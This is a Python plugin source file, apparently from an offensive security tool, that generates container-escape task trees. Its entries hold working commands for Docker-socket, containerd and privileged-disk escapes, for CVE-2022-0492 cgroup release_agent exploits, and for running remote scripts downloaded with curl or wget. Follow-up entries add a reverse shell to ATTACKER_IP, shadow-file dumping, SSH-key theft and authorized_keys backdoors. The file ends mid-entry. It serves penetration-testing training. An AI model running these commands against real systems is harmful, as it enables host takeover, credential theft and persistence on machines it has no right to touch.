"""
Linux Container Escape & Breakout Plugin

Generates tasks for container security assessment and escape techniques including:
- Docker socket exploitation
- Privileged container escapes (--privileged flag abuse)
- Container capability abuse (CAP_SYS_ADMIN, CAP_SYS_PTRACE, etc.)
- cgroup release_agent escape (CVE-2022-0492)
- Sensitive mount detection and abuse
- Namespace breakout techniques
- runc exploitation (CVE-2019-5736, CVE-2024-21626)
- Docker API exploitation
- Container-to-host privilege escalation
- Kubernetes pod escape techniques
- procfs/sysfs vulnerabilities
- Runtime socket abuse (containerd, CRI-O, podman)

Extracted from HackTricks Docker Security documentation
Generated by: CrackPot v1.0
Source: hacktricks/linux-hardening/privilege-escalation/docker-security/
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxContainerEscapePlugin(ServicePlugin):
    """Linux container escape and breakout enumeration plugin"""

    @property
    def name(self) -> str:
        return "linux-container-escape"

    @property
    def default_ports(self) -> List[int]:
        return [2375, 2376]  # Docker API ports

    @property
    def service_names(self) -> List[str]:
        return ['docker', 'docker-proxy', 'containerd', 'cri-o', 'podman']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect container runtime services

        Detects:
        - Docker daemon (ports 2375/2376)
        - Container runtime indicators
        - This plugin is primarily triggered manually for container assessment
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Docker API ports
        if port in self.default_ports:
            return True

        # Service name detection
        if any(svc in service for svc in ['docker', 'containerd', 'cri-o']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux container escape enumeration task tree"""

        tasks = {
            'id': 'linux-container-escape',
            'name': 'Linux Container Escape Assessment',
            'type': 'parent',
            'children': []
        }

        # === PHASE 1: CONTAINER ENVIRONMENT DETECTION ===
        tasks['children'].append(self._create_detection_tasks())

        # === PHASE 2: DOCKER SOCKET EXPLOITATION ===
        tasks['children'].append(self._create_docker_socket_tasks(target))

        # === PHASE 3: PRIVILEGED CONTAINER ESCAPES ===
        tasks['children'].append(self._create_privileged_escape_tasks())

        # === PHASE 4: CAPABILITY-BASED ESCAPES ===
        tasks['children'].append(self._create_capability_escape_tasks())

        # === PHASE 5: CGROUP ESCAPE (release_agent) ===
        tasks['children'].append(self._create_cgroup_escape_tasks())

        # === PHASE 6: SENSITIVE MOUNTS EXPLOITATION ===
        tasks['children'].append(self._create_sensitive_mount_tasks())

        # === PHASE 7: NAMESPACE ABUSE ===
        tasks['children'].append(self._create_namespace_abuse_tasks())

        # === PHASE 8: CVE EXPLOITATION ===
        tasks['children'].append(self._create_cve_exploitation_tasks())

        # === PHASE 9: DOCKER API EXPLOITATION ===
        if port in self.default_ports:
            tasks['children'].append(self._create_docker_api_tasks(target, port))

        # === PHASE 10: POST-ESCAPE ACTIONS ===
        tasks['children'].append(self._create_post_escape_tasks())

        return tasks

    def _create_detection_tasks(self) -> Dict[str, Any]:
        """Phase 1: Detect container environment and enumerate security posture"""
        return {
            'id': 'container-detection',
            'name': 'Phase 1: Container Environment Detection',
            'type': 'parent',
            'children': [
                {
                    'id': 'check-container-runtime',
                    'name': 'Detect Container Runtime',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /proc/1/cgroup | grep -E "docker|lxc|kubepods|containerd"',
                        'description': 'Check if running inside a container by examining cgroup membership',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            '/proc/1/cgroup': 'Process 1 cgroup file (init process)',
                            'grep -E': 'Extended regex search for container indicators'
                        },
                        'success_indicators': [
                            'docker/ found in cgroup path',
                            'kubepods/ found (Kubernetes)',
                            'lxc/ found (LXC container)',
                            'containerd/ found'
                        ],
                        'failure_indicators': [
                            'No container indicators found',
                            'File not found (running on bare metal)'
                        ],
                        'next_steps': [
                            'Enumerate container capabilities with capsh',
                            'Check for mounted docker socket',
                            'Identify security protections (AppArmor, Seccomp)',
                            'Look for privilege escalation vectors'
                        ],
                        'alternatives': [
                            'ls -la /.dockerenv  # Docker-specific file',
                            'cat /proc/1/mountinfo | grep docker',
                            'env | grep -i kube  # Kubernetes indicators'
                        ],
                        'notes': 'First step in container escape - determine if you are in a container',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'enumerate-capabilities',
                    'name': 'Enumerate Current Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'capsh --print',
                        'description': 'List current process capabilities to identify escape vectors',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '--print': 'Display current capability sets'
                        },
                        'success_indicators': [
                            'Current capabilities listed',
                            'Bounding set displayed',
                            'Dangerous caps found: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE'
                        ],
                        'failure_indicators': [
                            'capsh not installed',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'If CAP_SYS_ADMIN: Try cgroup escape or mount attacks',
                            'If CAP_SYS_PTRACE: Try process injection',
                            'If CAP_SYS_MODULE: Try kernel module loading',
                            'If CAP_SYS_RAWIO: Try direct I/O attacks',
                            'Check GTFOBins for capability-specific exploits'
                        ],
                        'alternatives': [
                            'cat /proc/$$/status | grep Cap',
                            'grep Cap /proc/self/status',
                            'getpcaps $$'
                        ],
                        'notes': 'Key capabilities for escape: SYS_ADMIN, SYS_PTRACE, SYS_MODULE, DAC_READ_SEARCH, SYS_RAWIO',
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'check-privileged-mode',
                    'name': 'Check for Privileged Mode',
                    'type': 'command',
                    'metadata': {
                        'command': 'ls /dev | wc -l && [ $(ls /dev | wc -l) -gt 50 ] && echo "Likely privileged" || echo "Not privileged"',
                        'description': 'Check if container has access to host devices (privileged mode indicator)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                        'flag_explanations': {
                            'ls /dev': 'List available device files',
                            'wc -l': 'Count lines (device count)',
                            '> 50': 'Privileged containers have 100+ devices'
                        },
                        'success_indicators': [
                            '100+ devices found (privileged)',
                            '/dev/sda, /dev/nvme visible (host disks)',
                            '/dev/kmem, /dev/mem present'
                        ],
                        'failure_indicators': [
                            '< 20 devices (restricted)',
                            'Only basic devices: console, null, random, tty'
                        ],
                        'next_steps': [
                            'If privileged: Attempt disk mounting escape',
                            'If privileged: Try release_agent cgroup escape',
                            'Look for writable host mounts',
                            'Check for sensitive /proc and /sys mounts'
                        ],
                        'alternatives': [
                            'fdisk -l  # Check for host disks',
                            'mount | grep "(ro"  # Check for read-only kernel mounts',
                            'grep Seccomp /proc/1/status  # 0 = disabled (privileged)'
                        ],
                        'notes': 'Privileged containers disable most security protections',
                        'estimated_time': '5 seconds'
                    }
                },
                {
                    'id': 'check-seccomp',
                    'name': 'Check Seccomp Status',
                    'type': 'command',
                    'metadata': {
                        'command': 'grep Seccomp /proc/1/status',
                        'description': 'Check if Seccomp syscall filtering is enabled',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            'Seccomp:': 'Seccomp status (0=disabled, 1=strict, 2=filter)',
                            '/proc/1/status': 'Init process status file'
                        },
                        'success_indicators': [
                            'Seccomp: 0 (disabled - more escape options)',
                            'Seccomp: 2 (enabled - need to bypass)'
                        ],
                        'failure_indicators': [
                            'File not accessible'
                        ],
                        'next_steps': [
                            'If disabled: More syscalls available for exploitation',
                            'If enabled: Check allowed syscalls with seccomp-tools',
                            'Try syscall filtering bypass techniques'
                        ],
                        'alternatives': [
                            'cat /proc/self/status | grep Seccomp',
                            'docker inspect <container> | grep -i seccomp  # From host'
                        ],
                        'notes': 'Seccomp restricts available syscalls - disabled in privileged containers'
                    }
                },
                {
                    'id': 'check-apparmor',
                    'name': 'Check AppArmor Profile',
                    'type': 'command',
                    'metadata': {
                        'command': 'cat /proc/self/attr/current',
                        'description': 'Check if AppArmor confinement is active',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '/proc/self/attr/current': 'Current AppArmor profile'
                        },
                        'success_indicators': [
                            'unconfined (no AppArmor protection)',
                            'docker-default (default profile)',
                            'Profile name displayed'
                        ],
                        'failure_indicators': [
                            'File not found (AppArmor not enabled)'
                        ],
                        'next_steps': [
                            'If unconfined: Fewer restrictions on file access',
                            'If confined: Research profile restrictions',
                            'Check for profile bypass techniques'
                        ],
                        'alternatives': [
                            'aa-status  # From host',
                            'cat /sys/kernel/security/apparmor/profiles'
                        ],
                        'notes': 'AppArmor provides path-based MAC (Mandatory Access Control)'
                    }
                },
                {
                    'id': 'enumerate-automated',
                    'name': 'Automated Container Enumeration',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'run-deepce',
                            'name': 'deepce Container Enumeration',
                            'type': 'command',
                            'metadata': {
                                'command': 'curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh',
                                'description': 'Automated container enumeration and escape detection',
                                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                                'flag_explanations': {
                                    '-sL': 'Silent mode with location following',
                                    '| sh': 'Pipe to shell for execution'
                                },
                                'success_indicators': [
                                    'Container detected',
                                    'Vulnerabilities identified',
                                    'Escape vectors suggested'
                                ],
                                'failure_indicators': [
                                    'Network blocked',
                                    'curl not available'
                                ],
                                'next_steps': [
                                    'Review identified vulnerabilities',
                                    'Test suggested escape techniques',
                                    'Enumerate found sensitive mounts'
                                ],
                                'alternatives': [
                                    'wget -O - https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh',
                                    'linpeas.sh  # Also enumerates containers',
                                    'CDK (Container Detection Kit)',
                                    'amicontained'
                                ],
                                'notes': 'deepce checks for: docker socket, capabilities, mounted files, CVEs',
                                'estimated_time': '2-3 minutes'
                            }
                        },
                        {
                            'id': 'run-amicontained',
                            'name': 'amicontained Privilege Check',
                            'type': 'command',
                            'metadata': {
                                'command': 'curl -sL https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64 -o amicontained && chmod +x amicontained && ./amicontained',
                                'description': 'Check container capabilities and security settings',
                                'tags': ['OSCP:HIGH', 'AUTOMATED'],
                                'success_indicators': [
                                    'Container runtime detected',
                                    'Capabilities enumerated',
                                    'Namespaces listed',
                                    'User namespace status shown'
                                ],
                                'next_steps': [
                                    'Focus on dangerous capabilities',
                                    'Check namespace isolation',
                                    'Verify seccomp/AppArmor status'
                                ],
                                'alternatives': [
                                    'Manual enumeration with capsh, grep, ls commands'
                                ],
                                'estimated_time': '1 minute'
                            }
                        }
                    ]
                }
            ]
        }

    def _create_docker_socket_tasks(self, target: str) -> Dict[str, Any]:
        """Phase 2: Docker socket exploitation"""
        return {
            'id': 'docker-socket-escape',
            'name': 'Phase 2: Docker Socket Exploitation',
            'type': 'parent',
            'children': [
                {
                    'id': 'find-docker-socket',
                    'name': 'Locate Docker Socket',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -name docker.sock 2>/dev/null',
                        'description': 'Search for mounted Docker socket (instant root escape vector)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'CRITICAL'],
                        'flag_explanations': {
                            '-name docker.sock': 'Search for Docker socket file',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'success_indicators': [
                            '/var/run/docker.sock found',
                            '/run/docker.sock found',
                            'Socket file is writable'
                        ],
                        'failure_indicators': [
                            'No socket found',
                            'Socket found but not accessible'
                        ],
                        'next_steps': [
                            'If found: Execute container escape via socket',
                            'Mount host filesystem in new container',
                            'Spawn privileged container with host namespaces',
                            'Extract host credentials and secrets'
                        ],
                        'alternatives': [
                            'ls -la /var/run/docker.sock',
                            'ls -la /run/docker.sock',
                            'find / -type s -name "*.sock" 2>/dev/null  # Find all sockets',
                            'netstat -anp | grep docker  # Check for network socket'
                        ],
                        'notes': 'Mounted Docker socket = game over. Full host control.',
                        'estimated_time': '10 seconds'
                    }
                },
                {
                    'id': 'docker-socket-escape-mount',
                    'name': 'Docker Socket Escape: Mount Host Root',
                    'type': 'command',
                    'metadata': {
                        'command': 'docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash',
                        'description': 'Escape by mounting host root filesystem in new container',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'CRITICAL'],
                        'flag_explanations': {
                            '-v /:/host/': 'Mount host root directory to /host/ in container',
                            'chroot /host/': 'Change root to host filesystem',
                            'bash': 'Spawn shell with full host access'
                        },
                        'success_indicators': [
                            'New container spawned',
                            'Shell prompt in host filesystem',
                            'Host files accessible',
                            'Full root privileges on host'
                        ],
                        'failure_indicators': [
                            'Permission denied',
                            'Docker command not found',
                            'Image not available'
                        ],
                        'next_steps': [
                            'Dump /etc/shadow for password hashes',
                            'Add SSH keys to /root/.ssh/authorized_keys',
                            'Read sensitive files (/root/*, /home/*)',
                            'Install backdoors for persistence',
                            'Exfiltrate data'
                        ],
                        'alternatives': [
                            'docker run -it --privileged --pid=host ubuntu nsenter --target 1 --mount --uts --ipc --net --pid -- bash',
                            'docker run -it --rm --pid=host --privileged ubuntu bash',
                            'docker run -it -v /:/host/ alpine:latest sh',
                            'docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined ubuntu chroot /host/ bash'
                        ],
                        'notes': 'Requires: docker socket access, available image. Works 100% if socket is mounted.',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': 'docker-socket-escape-nsenter',
                    'name': 'Docker Socket Escape: nsenter to Host',
                    'type': 'command',
                    'metadata': {
                        'command': 'docker run -it --rm --pid=host --privileged ubuntu nsenter --target 1 --mount --uts --ipc --net --pid -- bash',
                        'description': 'Escape using nsenter to join host namespaces via PID 1',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'CRITICAL'],
                        'flag_explanations': {
                            '--pid=host': 'Share host PID namespace',
                            '--privileged': 'All capabilities + device access',
                            'nsenter': 'Enter namespaces of target process',
                            '--target 1': 'Target PID 1 (init process on host)',
                            '--mount --uts --ipc --net --pid': 'Join all namespaces',
                            '-- bash': 'Execute bash in host context'
                        },
                        'success_indicators': [
                            'Shell spawned in host namespaces',
                            'Can see all host processes',
                            'Can access host network interfaces',
                            'Full host filesystem access'
                        ],
                        'failure_indicators': [
                            'nsenter not found in image',
                            'Permission denied'
                        ],
                        'next_steps': [
                            'Same as mount-based escape',
                            'Full host compromise achieved',
                            'Establish persistence',
                            'Pivot to other systems'
                        ],
                        'alternatives': [
                            'docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash',
                            'Install nsenter in container first if needed'
                        ],
                        'notes': 'nsenter method provides cleaner host access than chroot. Bypasses most container isolation.',
                        'estimated_time': '20 seconds'
                    }
                },
                {
                    'id': 'check-other-runtime-sockets',
                    'name': 'Check for Other Runtime Sockets',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -type s -name "*.sock" 2>/dev/null | grep -E "containerd|crio|podman|buildkit|frakti|rkt"',
                        'description': 'Search for alternative container runtime sockets (containerd, CRI-O, Podman)',
                        'tags': ['OSCP:HIGH', 'ENUM'],
                        'flag_explanations': {
                            '-type s': 'Search for socket files',
                            'grep -E': 'Extended regex for multiple patterns'
                        },
                        'success_indicators': [
                            '/run/containerd/containerd.sock found',
                            '/var/run/crio/crio.sock found',
                            '/run/podman/podman.sock found',
                            '/run/buildkit/buildkitd.sock found'
                        ],
                        'failure_indicators': [
                            'No alternative sockets found'
                        ],
                        'next_steps': [
                            'If containerd.sock: Use ctr command for escape',
                            'If crio.sock: Use crictl command',
                            'If podman.sock: Use podman command',
                            'Mount host filesystem via runtime API'
                        ],
                        'alternatives': [
                            'ls -la /run/containerd/containerd.sock',
                            'ls -la /var/run/crio/crio.sock',
                            'ls -la /run/podman/podman.sock'
                        ],
                        'notes': 'Kubernetes uses containerd/CRI-O instead of Docker. Same escape principles apply.'
                    }
                },
                {
                    'id': 'containerd-escape',
                    'name': 'containerd Socket Escape',
                    'type': 'command',
                    'metadata': {
                        'command': 'ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/alpine:latest host /bin/sh',
                        'description': 'Escape using containerd socket (Kubernetes environments)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'flag_explanations': {
                            '--address': 'Specify containerd socket path',
                            '--privileged': 'Run with all capabilities',
                            '--mount type=bind,src=/,dst=/host': 'Mount host root',
                            'options=rbind:rw': 'Recursive bind mount, read-write'
                        },
                        'success_indicators': [
                            'Container created',
                            'Host filesystem mounted at /host',
                            'Shell access to host files'
                        ],
                        'next_steps': [
                            'chroot /host /bin/bash',
                            'Access host filesystem',
                            'Extract credentials and secrets'
                        ],
                        'alternatives': [
                            'Use crictl for CRI-O runtime',
                            'Use podman for Podman runtime'
                        ],
                        'notes': 'Common in Kubernetes environments. ctr is containerd CLI tool.'
                    }
                }
            ]
        }

    def _create_privileged_escape_tasks(self) -> Dict[str, Any]:
        """Phase 3: Privileged container escape techniques"""
        return {
            'id': 'privileged-container-escape',
            'name': 'Phase 3: Privileged Container Escapes',
            'type': 'parent',
            'children': [
                {
                    'id': 'privileged-disk-mount',
                    'name': 'Privileged Escape: Mount Host Disk',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'identify-host-disk',
                            'name': 'Identify Host Disk Device',
                            'type': 'command',
                            'metadata': {
                                'command': 'fdisk -l 2>/dev/null | grep "Disk /dev/"',
                                'description': 'Enumerate available disk devices (requires privileged container)',
                                'tags': ['OSCP:HIGH', 'ENUM'],
                                'flag_explanations': {
                                    'fdisk -l': 'List all disk partitions',
                                    'grep "Disk /dev/"': 'Filter to show only disk devices'
                                },
                                'success_indicators': [
                                    'Host disks visible: /dev/sda, /dev/nvme0n1, /dev/vda',
                                    'Disk sizes match expected host storage'
                                ],
                                'failure_indicators': [
                                    'Permission denied (not privileged)',
                                    'No disks found'
                                ],
                                'next_steps': [
                                    'Identify root partition (usually /dev/sda1, /dev/nvme0n1p1)',
                                    'Mount the root partition',
                                    'Access host filesystem'
                                ],
                                'alternatives': [
                                    'lsblk',
                                    'cat /proc/partitions',
                                    'ls -la /dev/sd* /dev/nvme* /dev/vd*'
                                ],
                                'notes': 'Only works in privileged containers. Look for largest partition as root.'
                            }
                        },
                        {
                            'id': 'mount-host-disk',
                            'name': 'Mount Host Root Partition',
                            'type': 'command',
                            'metadata': {
                                'command': 'mkdir -p /mnt/hostfs && mount /dev/sda1 /mnt/hostfs',
                                'description': 'Mount host root filesystem to access all host files',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'CRITICAL'],
                                'flag_explanations': {
                                    'mkdir -p': 'Create mount point directory',
                                    'mount /dev/sda1': 'Mount the host root partition',
                                    '/mnt/hostfs': 'Mount point for host filesystem'
                                },
                                'success_indicators': [
                                    'Mount successful',
                                    'Host files visible in /mnt/hostfs',
                                    '/mnt/hostfs/etc/shadow accessible',
                                    '/mnt/hostfs/root/ accessible'
                                ],
                                'failure_indicators': [
                                    'Permission denied',
                                    'Mount point busy',
                                    'Wrong device specified'
                                ],
                                'next_steps': [
                                    'cat /mnt/hostfs/etc/shadow  # Dump password hashes',
                                    'cat /mnt/hostfs/root/.ssh/id_rsa  # Steal SSH keys',
                                    'echo "ssh-rsa AAAA..." >> /mnt/hostfs/root/.ssh/authorized_keys  # Add backdoor',
                                    'cat /mnt/hostfs/etc/crontab  # Check scheduled tasks',
                                    'Find sensitive files: credentials, keys, configs'
                                ],
                                'alternatives': [
                                    'mount /dev/nvme0n1p1 /mnt/hostfs  # For NVMe drives',
                                    'mount /dev/vda1 /mnt/hostfs  # For virtual disks',
                                    'debugfs /dev/sda1  # Interactive filesystem debugger'
                                ],
                                'notes': 'Privileged container required. This is a guaranteed escape if --privileged is set.',
                                'estimated_time': '10 seconds'
                            }
                        },
                        {
                            'id': 'debugfs-access',
                            'name': 'Alternative: debugfs File Access',
                            'type': 'command',
                            'metadata': {
                                'command': 'debugfs -w /dev/sda1',
                                'description': 'Interactive filesystem debugger (alternative to mount)',
                                'tags': ['OSCP:MEDIUM', 'MANUAL'],
                                'flag_explanations': {
                                    'debugfs': 'ext2/ext3/ext4 filesystem debugger',
                                    '-w': 'Open in read-write mode'
                                },
                                'success_indicators': [
                                    'debugfs prompt appears',
                                    'Can navigate filesystem with ls, cd commands',
                                    'Can extract files with dump command'
                                ],
                                'next_steps': [
                                    'debugfs: ls /root',
                                    'debugfs: dump /etc/shadow /tmp/shadow',
                                    'debugfs: cat /etc/passwd'
                                ],
                                'alternatives': [
                                    'mount /dev/sda1 /mnt  # Cleaner approach',
                                    'Use findfs UUID=<uuid> to locate partition first'
                                ],
                                'notes': 'Useful when mount command is restricted but debugfs is available'
                            }
                        }
                    ]
                },
                {
                    'id': 'privileged-check-protections',
                    'name': 'Verify Disabled Protections',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'check-kernel-mounts-rw',
                            'name': 'Check Kernel Filesystem Permissions',
                            'type': 'command',
                            'metadata': {
                                'command': 'mount | grep -v "(ro"',
                                'description': 'Check if kernel filesystems are writable (privileged indicator)',
                                'tags': ['OSCP:MEDIUM', 'ENUM'],
                                'success_indicators': [
                                    '/sys mounted read-write',
                                    '/proc mounted read-write',
                                    'cgroup filesystems writable'
                                ],
                                'alternatives': [
                                    'mount | grep "sysfs\\|proc\\|cgroup"'
                                ]
                            }
                        },
                        {
                            'id': 'check-proc-masks',
                            'name': 'Check /proc Masking',
                            'type': 'command',
                            'metadata': {
                                'command': 'mount | grep /proc.*tmpfs',
                                'description': 'Check if sensitive /proc paths are masked (should be empty in privileged)',
                                'tags': ['OSCP:MEDIUM', 'ENUM'],
                                'success_indicators': [
                                    'No tmpfs masks found (privileged)',
                                    '/proc/kcore accessible',
                                    '/proc/kmem accessible'
                                ],
                                'failure_indicators': [
                                    '/proc/kcore masked with tmpfs (protected)',
                                    '/proc/keys masked'
                                ]
                            }
                        }
                    ]
                }
            ]
        }

    def _create_capability_escape_tasks(self) -> Dict[str, Any]:
        """Phase 4: Capability-based escape techniques"""
        return {
            'id': 'capability-abuse-escape',
            'name': 'Phase 4: Capability-Based Escapes',
            'type': 'parent',
            'children': [
                {
                    'id': 'cap-sys-admin-escape',
                    'name': 'CAP_SYS_ADMIN Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'check-cap-sys-admin',
                            'name': 'Verify CAP_SYS_ADMIN',
                            'type': 'command',
                            'metadata': {
                                'command': 'capsh --print | grep -i sys_admin',
                                'description': 'Check for CAP_SYS_ADMIN capability (most powerful for escapes)',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN'],
                                'success_indicators': [
                                    'cap_sys_admin in Current or Bounding set'
                                ],
                                'next_steps': [
                                    'If present: Can mount filesystems',
                                    'If present: Can create cgroups',
                                    'If present: Can load kernel modules (with SYS_MODULE)',
                                    'Attempt cgroup release_agent escape',
                                    'Attempt mount-based escapes'
                                ],
                                'alternatives': [
                                    'grep CapEff /proc/self/status | awk \'{print $2}\'  # Check effective caps'
                                ]
                            }
                        },
                        {
                            'id': 'unshare-recover-caps',
                            'name': 'Recover Capabilities via unshare',
                            'type': 'command',
                            'metadata': {
                                'command': 'unshare -UrmCpf bash',
                                'description': 'Create new namespaces to recover full capabilities',
                                'tags': ['OSCP:HIGH', 'EXPLOIT'],
                                'flag_explanations': {
                                    '-U': 'Unshare user namespace',
                                    '-r': 'Map to root in new namespace',
                                    '-m': 'Unshare mount namespace',
                                    '-C': 'Unshare cgroup namespace',
                                    '-p': 'Unshare PID namespace',
                                    '-f': 'Fork before executing'
                                },
                                'success_indicators': [
                                    'New shell spawned',
                                    'Full capabilities regained',
                                    'Can now mount, create cgroups, etc.'
                                ],
                                'failure_indicators': [
                                    'unshare syscall blocked by seccomp',
                                    'Operation not permitted'
                                ],
                                'next_steps': [
                                    'Verify recovered caps: capsh --print',
                                    'Attempt cgroup escape',
                                    'Attempt mount-based escape'
                                ],
                                'alternatives': [
                                    'unshare -Urm bash',
                                    'unshare --user --map-root-user --mount bash'
                                ],
                                'notes': 'Works if unshare syscall not blocked. Recovers capabilities in new namespaces.'
                            }
                        }
                    ]
                },
                {
                    'id': 'cap-sys-ptrace-escape',
                    'name': 'CAP_SYS_PTRACE Exploitation',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo "Check CAP_SYS_PTRACE for process injection attacks"',
                        'description': 'CAP_SYS_PTRACE allows attaching to processes for memory manipulation',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'notes': 'With SYS_PTRACE: can inject shellcode into host processes, read process memory, manipulate process execution. Requires access to host PID namespace.'
                    }
                },
                {
                    'id': 'cap-sys-module-escape',
                    'name': 'CAP_SYS_MODULE Exploitation',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo "Check CAP_SYS_MODULE for kernel module loading"',
                        'description': 'CAP_SYS_MODULE allows loading kernel modules',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'notes': 'With SYS_MODULE: can load malicious kernel modules for full kernel-level control. Requires module file and insmod/modprobe.'
                    }
                },
                {
                    'id': 'cap-dac-read-search',
                    'name': 'CAP_DAC_READ_SEARCH Exploitation',
                    'type': 'command',
                    'metadata': {
                        'command': 'echo "Check CAP_DAC_READ_SEARCH for arbitrary file reads"',
                        'description': 'Bypass file read permission checks',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'notes': 'With DAC_READ_SEARCH: can read any file bypassing permissions. Use to extract /etc/shadow, /root/*, SSH keys.'
                    }
                }
            ]
        }

    def _create_cgroup_escape_tasks(self) -> Dict[str, Any]:
        """Phase 5: cgroup release_agent escape (CVE-2022-0492)"""
        return {
            'id': 'cgroup-release-agent-escape',
            'name': 'Phase 5: cgroup release_agent Escape (CVE-2022-0492)',
            'type': 'parent',
            'children': [
                {
                    'id': 'cgroup-escape-poc1',
                    'name': 'Classic release_agent Escape (PoC1)',
                    'type': 'command',
                    'metadata': {
                        'command': '''d=$(dirname $(ls -x /s*/fs/c*/*/r* |head -n1))
mkdir -p $d/w
echo 1 >$d/w/notify_on_release
t=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
touch /o
echo $t/c >$d/release_agent
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c
sh -c "echo 0 >$d/w/cgroup.procs"
sleep 1
cat /o''',
                        'description': 'Classic cgroup release_agent escape (requires privileged or CAP_SYS_ADMIN)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'CVE-2022-0492'],
                        'flag_explanations': {
                            'd=dirname ...': 'Find existing cgroup with release_agent',
                            'notify_on_release': 'Enable notification when cgroup becomes empty',
                            'release_agent': 'Set script to execute on host when cgroup empty',
                            'perdir=': 'Extract container path within host filesystem',
                            'cgroup.procs': 'Add process to cgroup then let it exit'
                        },
                        'success_indicators': [
                            'Host process list appears in /o file',
                            'Command executed on host',
                            'Can see host processes'
                        ],
                        'failure_indicators': [
                            'Read-only file system error',
                            'd variable is empty (no writable cgroup)',
                            'release_agent write failed'
                        ],
                        'next_steps': [
                            'Modify /c script to execute reverse shell',
                            'Example: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
                            'Extract host secrets via script',
                            'Write backdoor to host filesystem'
                        ],
                        'alternatives': [
                            'See PoC2 if this fails',
                            'See PoC3 for unknown container path scenarios'
                        ],
                        'notes': 'Works on: privileged containers, CAP_SYS_ADMIN, CVE-2022-0492 vulnerable kernels (<5.16.2)',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': 'cgroup-escape-poc2',
                    'name': 'RDMA cgroup release_agent Escape (PoC2)',
                    'type': 'command',
                    'metadata': {
                        'command': '''# Mount RDMA cgroup and create child cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# Enable notifications
echo 1 > /tmp/cgrp/x/notify_on_release
# Find container path on host
host_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)
# Set release_agent to payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent
# Create payload
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
# Trigger escape
sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"
# Read output
sleep 1 && cat /output''',
                        'description': 'Create new cgroup and exploit release_agent (when PoC1 fails)',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'CVE-2022-0492'],
                        'flag_explanations': {
                            'mount -t cgroup -o rdma': 'Mount RDMA cgroup controller',
                            '/tmp/cgrp/x': 'Child cgroup for triggering release',
                            'notify_on_release': 'Enable release notification',
                            'release_agent': 'Host-side script to execute'
                        },
                        'success_indicators': [
                            'Cgroup mounted successfully',
                            'release_agent set',
                            'Host process list in /output',
                            'Command executed on host'
                        ],
                        'failure_indicators': [
                            'Mount failed (cgroup controller unavailable)',
                            'Try changing "rdma" to "memory" or "cpu"'
                        ],
                        'next_steps': [
                            'Modify cmd script for reverse shell',
                            'echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /cmd',
                            'Extract sensitive data from host'
                        ],
                        'alternatives': [
                            'Change -o rdma to -o memory if RDMA unavailable',
                            'Change -o rdma to -o cpu',
                            'Use PoC3 if container path unknown'
                        ],
                        'notes': 'Requires CAP_SYS_ADMIN or vulnerable to CVE-2022-0492. More reliable than PoC1.',
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': 'cgroup-escape-poc3',
                    'name': 'release_agent Without Known Path (PoC3)',
                    'type': 'command',
                    'metadata': {
                        'command': '''wget https://raw.githubusercontent.com/ajxchapman/snocat/master/release_agent_pid_brute.sh -O /tmp/escape.sh
chmod +x /tmp/escape.sh
/tmp/escape.sh''',
